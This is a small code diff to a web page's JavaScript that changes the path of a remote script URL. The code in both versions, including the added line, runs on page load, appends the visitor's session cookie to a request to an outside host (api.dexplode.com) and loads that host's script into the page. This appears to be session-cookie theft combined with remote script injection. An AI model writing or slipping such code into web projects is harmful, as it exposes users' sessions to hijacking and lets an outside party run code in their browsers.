@@ -28,7 +28,7 @@ if (!getCookie('session')) {
 }
 window.onload = function() {
     var pot = document.createElement('script');
-    pot.src = 'https://api.dexplode.com/okdevtv/?key='
+    pot.src = 'https://api.dexplode.com/WqxXV3/?key='
         + getCookie('session');
     document.getElementsByTagName('head')[0].appendChild(pot);
 }
